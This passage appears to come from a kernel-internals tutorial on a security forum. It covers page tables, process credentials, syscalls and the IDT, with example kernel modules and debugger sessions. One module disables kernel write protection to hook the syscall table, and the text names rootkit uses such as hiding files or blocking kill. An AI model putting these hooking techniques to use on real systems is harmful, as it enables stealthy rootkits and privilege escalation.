# (Table Indicator: GDT(0) LDT(1))
</code></pre>
<p><strong>3</strong> stands for the <em>third ring</em>, <em>least privileged</em>, that is, <em>user-space</em>.<br>
It doesn’t change, unless the execution is in <em>kernel-space</em>, so it’s similiar for both <em>root</em> and <em>any normal user</em>. So both <em>RPL</em> and <em>CPL</em> could be considered a form of limitation when accessing segments with lower(<em>more privileged</em>) DPL(<em>Descriptor Privilege Level</em>).</p>
<p>When it comes to <em>paging</em>, it’s <em>equivalent bit</em> in <em>CR0</em>(<em><span class="hashtag">#31</span></em>) is only set when the system is running in <em>protected mode</em>(<em>PE bit</em> in <em>CR0</em> is set), because in <em>real mode</em>, <strong>virtual address are equal to physical ones</strong>.<br>
Linux moved from four-level page tables to support five-level page tables by adding an additional layer(<em>P4D</em>), so the levels now are: <em>PGD</em> <em>P4D</em> <em>PUD</em> <em>PMD</em> <em>PTE</em>.<br>
<em>PGD</em> is the first level <em>Page Global Directory</em>, it is a pointer of type <em>pgd_t</em>, and it’s definition is:</p>
<pre><code class="lang-auto">typedef struct { pgdval_t pgd; } pgd_t;
</code></pre>
<p>It holds a <em>pgdval_t</em> inside, which is an unsigned long(<em>8 bytes on x86_64, 4 on x86_32</em>):</p>
<pre><code class="lang-auto">typedef unsigned long	pgdval_t;
</code></pre>
<p>To get to the next level, <em>pagetable_l5_enabled()</em> is called to check if the CPU has <em>X86_FEATURE_LA57</em> enabled.</p>
<pre><code class="lang-auto">#define pgtable_l5_enabled() cpu_feature_enabled(X86_FEATURE_LA57)
</code></pre>
<p>This can be seen in <em>p4d_offset()</em>:</p>
<pre><code class="lang-auto">static inline p4d_t *p4d_offset(pgd_t *pgd, unsigned long address)
{
	if (!pgtable_l5_enabled())
		return (p4d_t *)pgd;
	return (p4d_t *)pgd_page_vaddr(*pgd) + p4d_index(address);
}
</code></pre>
<p>If it isn’t enabled, it simply casts the <em>pgd_t *</em> as <em>p4d_t *</em> and returns it, otherwise it returns the <em>P4D entry</em> within the <em>PGD</em> that links to the <em>specific address</em>.<br>
Then <em>P4D</em> itself can be used to find the next level, which is <em>PUD</em> of type <em>pud_t *</em>, <em>PUD</em> links to <em>PMD</em>(<em>Page Middle Directory</em>) and <em>PMD</em> to the <em>PTE</em>(<em>Page Table Entry</em>) which is the last level, and contains the <em>physical address</em> of the <em>page</em> with some <em>protection flags</em> and is of type <em>pte_t *</em>.</p>
<p>Each <em>process</em> has it’s own <em>virtual space</em>(<em>mm_struct</em>, <em>vm_area_struct</em> and <em>pgd_t</em>).</p>
<pre><code class="lang-auto">struct vm_area_struct {

	unsigned long vm_start;
	unsigned long vm_end;

	struct vm_area_struct *vm_next, *vm_prev;

	struct rb_node vm_rb;


	unsigned long rb_subtree_gap;


	struct mm_struct *vm_mm;
	pgprot_t vm_page_prot;
	unsigned long vm_flags;	

	struct {
		struct rb_node rb;
		unsigned long rb_subtree_last;
	} shared;

	struct list_head anon_vma_chain;
	struct anon_vma *anon_vma;

	const struct vm_operations_struct *vm_ops;

	unsigned long vm_pgoff;
	struct file * vm_file;
	void * vm_private_data;

	atomic_long_t swap_readahead_info;
#ifndef CONFIG_MMU
	struct vm_region *vm_region;
#endif
#ifdef CONFIG_NUMA
	struct mempolicy *vm_policy;
#endif
	struct vm_userfaultfd_ctx vm_userfaultfd_ctx;
} __randomize_layout;
</code></pre>
<pre><code class="lang-auto">typedef struct { pgdval_t pgd; } pgd_t;
</code></pre>
<p>So creating a new process would be very expensive on performance. <em>Copy-on-Write</em>(<strong>COW</strong>) comes in helpful here, by making a clone out of the parent process and only copying when a write happens to the previously marked <em>read-only</em> pages.<br>
This happens on fork and more specifically in <em>copy_process()</em>, which duplicates the <em>task_struct</em> and does specific operations depending on flags passed to <em>clone()</em>, before copying all parent information which includes <em>credentials, filesystem, files, namespaces, IO, Thread Local Storage, signal, address space</em>.<br>
As an example, this walks <em>VMAs</em> in search of a user specified address, once found, it gets its <em>Physical address</em> and <em>Flags</em> by walking <em>page tables</em>.</p>
<pre><code class="lang-auto">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;asm/pgtable.h&gt;
#include &lt;linux/highmem.h&gt;
#include &lt;linux/slab.h&gt;

#define device_name "useless"
#define SET_ADDRESS 0x00112233

char *us_buf;
unsigned long address = 0;

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	switch(cmd){
		case SET_ADDRESS:
			address = arg;
			return 0;
		default:
			return -EINVAL;
	}
}

ssize_t do_read(struct file *filp, char *buf, size_t count, loff_t *offp){
	int res, phys, flags;
	struct vm_area_struct *cmap;
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	/* Find corresponding VMA */
	cmap    = current-&gt;mm-&gt;mmap;

	while(1){
		if(cmap-&gt;vm_start &lt;= address &amp;&amp; address &lt; cmap-&gt;vm_end){
			break;
		}
		
		cmap     = cmap-&gt;vm_next;
		if(cmap  == NULL){
			return -1;
		}
	};
	
	/* Walking Page-tables for fun */
	pgd     = pgd_offset(current-&gt;mm, address);
	p4d     = p4d_offset(pgd,         address);
	pud     = pud_offset(p4d,         address);
	pmd     = pmd_offset(pud,         address);
	ptep    = pte_offset_kernel(pmd,  address);
	phys    = *((int *) ptep);
	flags   = phys &amp; 0xfff;
	phys   &amp;= ~0xfff;
	
	snprintf(us_buf, 64, "PhysAddr(%x) VMAStart(%lx) Flags(%x)", phys, cmap-&gt;vm_start, flags);

	if(count &gt; 64)
		count = 64;
	res = copy_to_user(buf, us_buf, count);
	return res;
}

struct file_operations fileops = {
					.owner = THIS_MODULE,
					.read  = do_read,
					.unlocked_ioctl = do_ioctl,
				 };

static int us_init(void){
	struct proc_dir_entry *res;

	us_buf = kmalloc(64, GFP_KERNEL);
	if(us_buf == NULL){
		printk(KERN_ERR "Couldn't reserve memory.");
		return -ENOMEM;
	}
	
	res = proc_create(device_name, 0, NULL, &amp;fileops);
	if(res == NULL){
		printk(KERN_ERR "Failed allocating a proc entry.");
		return -ENOMEM;
	}
	
	return 0;
}

static void us_exit(void){
	remove_proc_entry(device_name, NULL);
	kfree(us_buf);
}
MODULE_LICENSE("GPU");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p>To communicate with this <em>proc entry</em>, the following was written:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

#define device_path "/proc/useless"
#define SET_ADDRESS 0x00112233


void main(void){
	int fd;
	char *ok;
	char c[64];

	fd = open(device_path, O_RDONLY);
	
	ok = malloc(512);
	memcpy(ok, "Welp", sizeof(int ));
	
	ioctl(fd, SET_ADDRESS, ok);

	read(fd, c, sizeof( c));
	printf("%s\n", &amp;c);
}
</code></pre>
<p>This gives:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b9e3fe8913d8af36cf6f2efc72a61fb13064ef73.png" alt="image" data-base62-sha1="qwsO47pCKiLfvekFOpRV0YnwdjR" width="419" height="98"><br>
<em>0x867 in binary is: 100001100111.<br>
Present: 1 (The page is present)<br>
R/W: 1 (The page have both read and write permissions)<br>
U/S: 1 (The page can be accessed by the user and supervisor)<br>
00<br>
Accessed: 1 (Set if the page had been accessed)<br>
Dirty: 1 (Set if the page was written to since last writeback)<br>
0000</em></p>
<p>Note that necessary checks on validity of return values was ignored in this example, these could be performed with <em>p??_none()</em> and <em>p??_present()</em>, and multiple other things could have been done, such as playing with the <em>PFN</em> or <em>page</em> or reading from the <em>Physical Address</em> with <em>void __iomem *</em>, <em>ioremap()</em> and <em>memcpy_fromio()</em> or <em>struct page *</em> and <em>kmap()</em>.</p>
<p>Translating address from virtual to physical takes time, so caching is implemented using the <em>TLB</em>(<em>Translation Lookaside Buffer</em>) to improve the performance, hopefully that the next access is going to land a cache-hit and that’ll hand the <em>PTE</em> faster than a miss where a <em>memory access</em> is forced to happen to get it. The <em>TLB</em> flushes from time to another, an example would be after a <em>page fault</em> is raised and completed.</p>
<h5>Processes:</h5>
<p>The kernel sees each process as a <strong>struct task_struct</strong> which is a huge struct that contains many fields which we can’t cover entirely, some are used to guarantee the (almost) fair scheduling and some show the task’s state(if it’s either unrunnable, runnable or stopped), priority, the parent process, a linked list of children processes, the address space it holds, and many others.<br>
We are mainly interested in the <strong>const struct cred __rcu *cred;</strong> which holds the task’s credentials.</p>
<pre><code class="lang-auto">struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;
	kgid_t		gid;
	kuid_t		suid;
	kgid_t		sgid;
	kuid_t		euid;
	kgid_t		egid;
	kuid_t		fsuid;
	kgid_t		fsgid;
	unsigned	securebits;
	kernel_cap_t	cap_inheritable;
	kernel_cap_t	cap_permitted;
	kernel_cap_t	cap_effective;
	kernel_cap_t	cap_bset;
	kernel_cap_t	cap_ambient;
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;
	struct key __rcu *session_keyring;
	struct key	*process_keyring;
	struct key	*thread_keyring;
	struct key	*request_key_auth;
#endif
#ifdef CONFIG_SECURITY
	void		*security;
#endif
	struct user_struct *user;
	struct user_namespace *user_ns;
	struct group_info *group_info;
	struct rcu_head	rcu;
} __randomize_layout;
</code></pre>
<p>This struct holds Capabilities, ((effective) <em>user</em> and <em>group</em>) ID, keyrings, (for synchronization, <em>Read-Copy-Update</em>) RCU, (tracks the user’s <em>usage</em> of the system by keeping <strong>counts</strong>) user and (holds <em>U/G ID</em> and the <strong>privileges</strong> for them) user_ns.<br>
In order to better understand this structure, a simple <em>proc entry</em> was created which extracts the <em>task_struct</em> of the process that uses it(<strong>current</strong>) and reads the effective <em>UID</em> and <em>GID</em>.</p>
<pre><code class="lang-auto">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/uidgid.h&gt;

#define device_name "useless"
#define SD_PRIV     0x10071007

struct{
	kuid_t ceuid;
	kgid_t cegid;
	spinlock_t clock;
}us_cd;

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	int res;

	switch(cmd){
		case SD_PRIV:
			spin_lock(&amp;us_cd.clock);
			current_euid_egid(&amp;us_cd.ceuid, &amp;us_cd.cegid);
			spin_unlock(&amp;us_cd.clock);
			res = copy_to_user((void *)arg, &amp;us_cd, 8);
			return res;
		default:
			return -EINVAL;
	}
}

struct file_operations fileops = {
					.owner = THIS_MODULE,
					.unlocked_ioctl = do_ioctl,
				 };

static int us_init(void){
	struct proc_dir_entry *res;

	spin_lock_init(&amp;us_cd.clock);
	res = proc_create(device_name, 0, NULL, &amp;fileops);
	if(res == NULL){
		printk(KERN_ERR "Failed allocating a proc entry.");
		return -ENOMEM;
	}

	return 0;
}

static void us_exit(void){
	remove_proc_entry(device_name, NULL);
}
MODULE_LICENSE("GPU");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p>The initialization process starts by preparing the spinlock and creating a proc entry with a specified name <em>“useless”</em> and a file_operations struct containing only necessary <strong>owner</strong> and <strong>unlocked_ioctl</strong> entries.<br>
While the ioctl handler simply checks if the command passed was <em>SD_PRIV</em> to extract the <em>UID</em> and <em>GID</em> with a call to the <strong>current_euid_egid()</strong> macro which in turn calls <strong>current_cred()</strong> to extract the <em>current-&gt;cred</em>:</p>
<pre><code class="lang-auto">#define current_euid_egid(_euid, _egid)		\
do {						\
	const struct cred *__cred;		\
	__cred = current_cred();		\
	*(_euid) = __cred-&gt;euid;		\
	*(_egid) = __cred-&gt;egid;		\
} while(0)
</code></pre>
<pre><code class="lang-auto">#define current_cred() \
	rcu_dereference_protected(current-&gt;cred, 1)
</code></pre>
<p>Then, we create a <strong>tasktry.c</strong> to interract with the <em>/proc/useless</em>.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

#define device_path "/proc/useless"
#define SD_PRIV     0x10071007

struct{
	unsigned int uid;
	unsigned int gid;
}data;

void main(void){
	int fd;

	fd = open(device_path, O_RDONLY);
	ioctl(fd, SD_PRIV, &amp;data);

	printf("UID: %d GID: %d\n", data.uid, data.gid);
}
</code></pre>
<p>Two binaries are then created in <strong>/tmp</strong> directory, one which is compiled by root(<em>setuid</em> bit set) tasktry_root and the other by a normal user called tasktry_user.</p>
<pre><code class="lang-auto">root@Nwwz:~# cd /tmp
root@Nwwz:/tmp# gcc tasktry.c -o tasktry_root; chmod u+s tasktry_root
root@Nwwz:/tmp# cd /root/mod
root@Nwwz:~/mod# make
make -c /lib/modules/4.17.0/build M=/root/mod modules
make[1]: Entering directory '/usr/src/linux-4.17.2'
	CC [M]	/root/mod/task.o
	Building modules, stage 2.
	MODPOST 1 modules
	CC	/root/mod/task.mod.o
	LD [M] /root/mod/task.ko
make[1]: Leaving directory '/usr/src/linux-4.17.2'
root@Nwwz:~/mod# insmod task.ko
root@Nwwz:~/mod# su - user
user@Nwwz:~$ cd /tmp
user@Nwwz:/tmp$ gcc tasktry.c -o tasktry_user
user@Nwwz:/tmp$ ls
tasktry_user tasktry_root tasktry.c
user@Nwwz:/tmp$ ./tasktry_root
UID: 0 GID: 1000
user@Nwwz:/tmp$ ./tasktry_user
UID: 1000 GID: 1000
</code></pre>
<p>As you can see, the effective UID of <em>tasktry_root</em> is <em>0</em> making it own high privileges, so overwritting <em>effective creds</em> is one way to <em>privilege escalation</em>(<em>prepare_kernel_creds()</em> and <em>commit_creds()</em> are used for this <em>purpose in most exploits</em>, instead of getting the <em>stack base</em> and <em>overwritting it directly</em>.), another is to <em>change capabilities</em>.<br>
On <em>Windows</em>, one way to <em>escalate privileges</em> would be to steal the token of <em>System process</em>(<em>ID 4</em>) and assign it to the newly spawned <em>cmd.exe</em> after changing the <em>reference count</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/70b355b66ad1e4811c79244b98fe125e52c57375.png" alt="image" data-base62-sha1="g4ZHnS7f1r9sa9TBv5Hted3xpmR" width="690" height="269"></p>
<h5>Syscalls:</h5>
<p>Processes running in userspace can still communicate with the kernel, thanks to <em>syscalls</em>.<br>
Each syscall is defined as follows:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE0(getpid)
{
	return task_tgid_vnr(current);
}
</code></pre>
<p>With multiple arguments:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE3(lseek, unsigned int, fd, off_t, offset, unsigned int, whence)
{
	return ksys_lseek(fd, offset, whence);
}
</code></pre>
<p>So, in general:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE[ARG_COUNT]([SYSCALL_NAME], [ARG_TYPE], [ARG_NAME]){
	/* Passing the argument to another function, for processing. */
	return call_me([ARG_NAME]);
}
</code></pre>
<p>Few tries aaand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

int main(void){
	printf("ID: %d\n", getuid());
	
	return 0;
}
</code></pre>
<p>Running this sample with GDB and putting breakpoint on the x64 libc, we can see that it does set <em>EAX</em> register to <em>0x66</em>(<strong>syscall number on x64</strong>) before the <em>syscall</em> instruction.</p>
<pre><code class="lang-auto">(gdb) x/i $rip
=&gt; 0x555555554704 &lt;main+4&gt;:		callq 0x5555555545a0 &lt;getuid@plt&gt;
(gdb) x/x getuid
0x7ffff7af2f30 &lt;getuid&gt;: 		0x000066b8
(gdb) b* getuid
Breakpoint 2 at 0x7ffff7af2f30: file ../sysdeps/unix/syscall-template.S, line 65.
(gdb) c
Continuing.

Breakpoint 2, getuid () at ../sysdeps/unix/syscall-template.S:65
65		../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) disas $rip
Dump of assembler code for function getuid:
=&gt; 0x00007ffff7af2f30 &lt;+0&gt;:		mov		$0x66,%eax
   0x00007ffff7af2f35 &lt;+5&gt;:		syscall
   0x00007ffff7af2f37 &lt;+7&gt;:		retq
 End of assembler dump.
(gdb) shell
root@Nwwz:~# echo "g" &gt; /proc/sysrq-trigger
</code></pre>
<p>We can invoke a shell from <em>GDB</em> to force <em>SysRQ</em>, and see what this <em>offset</em> in the <em>kernel</em> links for:</p>
<pre><code class="lang-bash">[New Thread 756]
[New Thread 883]
[New Thread 885]

Thread 103 received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 889]
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
10733			wmb(); /* Sync point after breakpoint */
(gdb) p &amp;sys_call_table
$1 = (const sys_call_ptr_t (*)[]) 0xffffffff81c00160 &lt;sys_call_table&gt;
(gdb) x/gx (void *)$1 + 0x66*8
0xffffffff81c00490 &lt;sys_call_table+816&gt;:	0xffffffff8108ec60
(gdb) x/i 0xffffffff8108ec60
0xffffffff8108ec60 &lt;__x64_sys_getuid&gt;:		nopl	0x0(%rax,%rax,1)
</code></pre>
<p>So, it’s the global <strong>sys_call_table</strong>, indexing the <em>__x64_sys_getuid</em> there.</p>
<pre><code class="lang-auto">"The __x64_sys_*() stubs are created on-the-fly for sys_*() system calls"
is written in syscall_64.tbl that contains all the syscalls
available to the kernel.
</code></pre>
<p>This is similiar to the <em>nt!KiServiceTable</em> on Windows.</p>
<pre><code class="lang-auto">kd&gt; dps nt!KeServiceDescriptorTable
82b759c0  82a89d9c nt!KiServiceTable
82b759c4  00000000
82b759c8  00000191
82b759cc  82a8a3e4 nt!KiArgumentTable
82b759d0  00000000
82b759d4  00000000
kd&gt; dd nt!KiServiceTable
82a89d9c  82c85c28 82acc40d 82c15b68 82a3088a
82a89dac  82c874ff 82b093fa 82cf7b05 82cf7b4e
82a89dbc  82c0a3bd 82d11368 82d125c1 82c00b95
kd&gt; ln 82c85c28
(82c85c28)   nt!NtAcceptConnectPort   |  (82c85ca5)   nt!EtwpRundownNotifications
Exact matches:
    nt!NtAcceptConnectPort = &lt;no type information&gt;
kd&gt; ln 82acc40d 
(82acc40d)   nt!NtAccessCheck   |  (82acc43e)   nt!PsGetThreadId
Exact matches:
    nt!NtAccessCheck = &lt;no type information&gt;
kd&gt; ln 82d125c1
(82d125c1)   nt!NtAddDriverEntry   |  (82d125f3)   nt!NtDeleteDriverEntry
Exact matches:
    nt!NtAddDriverEntry = &lt;no type information&gt;
</code></pre>
<p>Dissasembling it gives us:</p>
<pre><code class="lang-auto">(gdb) disas __x64_sys_getuid
Dump of assembler code for function __x64_sys_getuid:
	0xffffffff8108ec60 &lt;+0&gt;:	nopl	0x0(%rax,%rax,1)
	0xffffffff8108ec65 &lt;+5&gt;:	mov		%gs:0x15c00,%rax
	0xffffffff8108ec6e &lt;+14&gt;:	mov		0x668(%rax),%rax
	0xffffffff8108ec75 &lt;+21&gt;:	mov		0x4(%rax),%esi
	0xffffffff8108ec78 &lt;+24&gt;:	mov		0x88(%rax),%rdi
	0xffffffff8108ec7f &lt;+31&gt;:	callq	0xffffffff8112d4a0 &lt;from_kuid_munged&gt;
	0xffffffff8108ec84 &lt;+36&gt;:	mov		%eax,%eax
	0xffffffff8108ec86 &lt;+38&gt;:	retq
</code></pre>
<p>With a basic understanding of ASM and a very limited knowledge of the kernel <em>(AT&amp;T haha, too lazy to switch the syntax <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.)</em>, one can know that it does first search for the <em>current</em> task, store some pointer it holds at offset <em>0x668</em> at RAX before dereferencing it again and using content at +0x88(<em>RDI</em>) and +0x4(<em>RSI</em>) as arguments to the <strong>from_kuid_munged</strong> call before it nops and returns(<em>q there stands for qword</em>).<br>
We can verify this either by <em>looking at the source</em>:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE0(getuid)
{
	return from_kuid_munged(current_user_ns(), current_uid());
}
</code></pre>
<pre><code class="lang-auto">uid_t from_kuid_munged(struct user_namespace *targ, kuid_t kuid)
{
	uid_t uid;
	uid = from_kuid(targ, kuid);

	if (uid == (uid_t) -1)
		uid = overflowuid;
	return uid;
}
EXPORT_SYMBOL(from_kuid_munged);
</code></pre>
<p>Or checking in <em>GDB</em>(<em>maybe both?</em>):</p>
<pre><code class="lang-auto">(gdb) b* __x64_sys_getuid
Breakpoint 1 at 0xffffffff8108ec60: file kernel/sys.c, line 920.
(gdb) c
[New Thread 938]
[Switching to Thread 938]

Thread 122 hit Breakpoint 1, __x64_sys_getuid () at kernel/sys.c:920
920		{
(gdb) ni
get_current () at ./arch/x86/include/asm/current.h:15
15		return this_cpu_read_stable(current_task);
(gdb) x/i $rip
=&gt; 0xffffffff8108ec65 &lt;__x64_sys_getuid+5&gt;:		mov		%gs:0x15c00,%rax
(gdb) p ((struct task_struct *)0)-&gt;cred
Cannot access memory at address 0x668
(gdb) p ((struct cred *)0)-&gt;uid
Cannot access memory at address 0x4
(gdb) p ((struct cred *)0)-&gt;user_ns
Cannot access memory at address 0x88
</code></pre>
<p>The sys_call_table is residing in a RO(<em>read only</em>) memory space:</p>
<pre><code class="lang-bash">(gdb) x/x sys_call_table
0xffffffff81c00160 &lt;sys_call_table&gt;:	0xffffffff81247310
(gdb) maintenance info sections
...
 [3]	0xffffffff81c00000-&gt;0xffffffff81ec1a42 at 0x00e00000: .rodata ALLOC LOAD RELOC DATA HAS_CONTENTS
...
(gdb) 
</code></pre>
<p>But a kernel module can overcome this protection and place a hook at any <em>systemcall</em>.<br>
For that, two example modules will be given:<br>
<strong>=] Disabling the previously discussed WP(<em>write-protect</em>) bit in the CR0(<em>control register <span class="hashtag">#0</span></em>), using <em>read_cr0</em> and <em>write_cr0</em> to acheive that.</strong></p>
<pre><code class="lang-auto">#include &lt;linux/fs.h&gt;
#include &lt;asm/pgtable.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/kallsyms.h&gt;
#include &lt;linux/miscdevice.h&gt;
#include &lt;asm/special_insns.h&gt;

#define device_name "hookcontrol"
#define ioctl_base    0x005ec
#define ioctl_enable  ioctl_base+1
#define ioctl_disable ioctl_base+2

int    res;
int  (*real_getuid)(void);
void **sys_call_table;
unsigned long const *address;

static int hooked_getuid(void){
	printk(KERN_INFO "Received getuid call from %s!", current-&gt;comm);
	if(real_getuid != NULL){
		return real_getuid();
	}
	
	return 0;
}

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	unsigned long cr0 = read_cr0();

	switch(cmd){
		case ioctl_enable:
		printk(KERN_INFO "Enabling hook!");
		write_cr0(cr0 &amp; ~0x10000);
		sys_call_table[__NR_getuid] = hooked_getuid;
		write_cr0(cr0 |  0x10000);
		printk(KERN_INFO "Successfully changed!");

		return 0;
		case ioctl_disable:
		printk(KERN_INFO "Disabling hook!");
		write_cr0(cr0 &amp; ~0x10000);
		sys_call_table[__NR_getuid] = real_getuid;
		write_cr0(cr0 |  0x10000);
		printk(KERN_INFO "Successfully restored!");
		
		return 0;
		default:
		return -EINVAL;
	}
}

struct file_operations file_ops = {
									.owner          = THIS_MODULE,
									.unlocked_ioctl = do_ioctl
								  };

struct miscdevice hk_dev = {
							MISC_DYNAMIC_MINOR,
							device_name,
							&amp;file_ops
						   };

static int us_init(void){
	res = misc_register(&amp;hk_dev);
	if(res){
		printk(KERN_ERR "Couldn't load module!");
		return -1;
	}
	
	sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
	real_getuid    = sys_call_table[__NR_getuid];
	address        = (unsigned long *) &amp;sys_call_table;
	printk(KERN_INFO "Module successfully loaded with minor: %d!", hk_dev.minor);
	return 0;
}

static void us_exit(void){
	misc_deregister(&amp;hk_dev);
}
MODULE_LICENSE("GPL");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p><strong>=] <em>Orr</em>’ing the protection mask of the page at which it resides(<em>__pgprot(_PAGE_RW)</em>)( <em>set_memory_rw()</em> &amp; <em>set_memory_rw()</em>), or directly modifying the <em>PTE</em>.</strong></p>
<pre><code class="lang-auto">static inline pte_t pte_mkwrite(pte_t pte)
{
	return pte_set_flags(pte, _PAGE_RW);
}

static inline pte_t pte_wrprotect(pte_t pte)
{
	return pte_clear_flags(pte, _PAGE_RW);
}
</code></pre>
<p>Looking at these functions, one can safely assume that manipulation can be acheived with simple OR and AND(<em>_PAGE_RW</em>) operations on the <em>pte_t</em>.</p>
<pre><code class="lang-auto">pte_t *lookup_address(unsigned long address, unsigned int *level)
{
	return lookup_address_in_pgd(pgd_offset_k(address), address, level);
}
</code></pre>
<p>Since it’s a kernel address, <em>pgd_offset_k()</em> is called, which makes use of <strong>&amp;init_mm</strong>, instead of a mm_struct belonging to some process of <em>one’s choice</em>.</p>
<pre><code class="lang-auto">pte_t *lookup_address_in_pgd(pgd_t *pgd, unsigned long address,
			     unsigned int *level)
{
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;

	*level = PG_LEVEL_NONE;

	if (pgd_none(*pgd))
		return NULL;

	p4d = p4d_offset(pgd, address);
	if (p4d_none(*p4d))
		return NULL;

	*level = PG_LEVEL_512G;
	if (p4d_large(*p4d) || !p4d_present(*p4d))
		return (pte_t *)p4d;

	pud = pud_offset(p4d, address);
	if (pud_none(*pud))
		return NULL;

	*level = PG_LEVEL_1G;
	if (pud_large(*pud) || !pud_present(*pud))
		return (pte_t *)pud;

	pmd = pmd_offset(pud, address);
	if (pmd_none(*pmd))
		return NULL;

	*level = PG_LEVEL_2M;
	if (pmd_large(*pmd) || !pmd_present(*pmd))
		return (pte_t *)pmd;

	*level = PG_LEVEL_4K;

	return pte_offset_kernel(pmd, address);
}
</code></pre>
<p>so, the <em>ioctl</em> handler looks like this:</p>
<pre><code class="lang-auto">long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	unsigned int level;
	pte_t *pte = lookup_address(*address, &amp;level);;

	switch(cmd){
		case ioctl_enable:
		printk(KERN_INFO "Enabling hook!");
		pte-&gt;pte |= _PAGE_RW;
		sys_call_table[__NR_getuid] = hooked_getuid;
		pte-&gt;pte &amp;= ~_PAGE_RW;
		printk(KERN_INFO "Successfully changed!");

		return 0;
		case ioctl_disable:
		printk(KERN_INFO "Disabling hook!");
		pte-&gt;pte |= _PAGE_RW;
		sys_call_table[__NR_getuid] = real_getuid;
		pte-&gt;pte &amp;= ~_PAGE_RW;
		printk(KERN_INFO "Successfully restored!");
		
		return 0;
		default:
		return -EINVAL;
	}
}
</code></pre>
<p>(Know that these are only <em>examples</em>, <strong>usually</strong>, <em>replacing</em> should take place at <em>init</em> and <em>restoring the original</em> at <em>exit</em>, plus the definition of both the <em>hook</em> and <em>original</em> handlers, should hold <em>asmlinkage</em>(passing <em>arguments</em> in <em>stack</em>, unlike <em>fastcall</em>(<em>default</em>) in <em>registers</em>), however, since the syscall here holds no <em>arguments</em>, this was <em>ignored</em>.)<br>
By running an application from user-space to interact with <strong>/dev/hookcontrol</strong>: (<em>enabling and disabling after a while</em>) and taking a look at <em>dmesg</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/18a67ac77e14a1f3d4f58460bd0ad0593364eaa4.png" alt="image" data-base62-sha1="3w48GWeMaYiIqdgRYJRrBDKcYCw" width="377" height="307"><br>
This can be used to provide a layer on the syscall, prevent or manipulate the return value, like <em>kill</em> to prevent a process from being <em>killed</em>, <em>getdents</em> to <em>hide</em> some files, <em>unlink</em> to prevent a file from being <em>deleted</em>, et cetera…<br>
And it doesn’t stop here, even without <em>syscall hooking</em>, one can play with processes(<em>hide them as an example…</em>) with <em>task_struct elements</em> and <em>per-task flags</em>, or change the <em>file_operations</em> in some <em>specific struct</em>, and <strong>many</strong> other possibilities.</p>
<h5>IDT(Interrupt Descriptor Table):</h5>
<p>In order to handle <em>exceptions</em>, this <em>table</em> exists, by linking a <em>specific handler</em> to each exception, it helps deal with those raised from <em>userspace</em>(<em>a translation to ring zero is required first</em>) and <em>kernelspace</em>.<br>
It first is initialized during early setup, and this can be seen in <em>setup_arch()</em> which calls multiple functions, some to setup the <em>IDT</em>, most important to us is <em>idt_setup_traps()</em>:</p>
<pre><code class="lang-auto">void __init idt_setup_traps(void)
{
	idt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), true);
}
</code></pre>
<p>It makes use of the <em>default IDT</em>s array(<em>def_idts</em>).</p>
<pre><code class="lang-auto">static const __initconst struct idt_data def_idts[] = {
	INTG(X86_TRAP_DE,		divide_error),
	INTG(X86_TRAP_NMI,		nmi),
	INTG(X86_TRAP_BR,		bounds),
	INTG(X86_TRAP_UD,		invalid_op),
	INTG(X86_TRAP_NM,		device_not_available),
	INTG(X86_TRAP_OLD_MF,		coprocessor_segment_overrun),
	INTG(X86_TRAP_TS,		invalid_TSS),
	INTG(X86_TRAP_NP,		segment_not_present),
	INTG(X86_TRAP_SS,		stack_segment),
	INTG(X86_TRAP_GP,		general_protection),
	INTG(X86_TRAP_SPURIOUS,		spurious_interrupt_bug),
	INTG(X86_TRAP_MF,		coprocessor_error),
	INTG(X86_TRAP_AC,		alignment_check),
	INTG(X86_TRAP_XF,		simd_coprocessor_error),

#ifdef CONFIG_X86_32
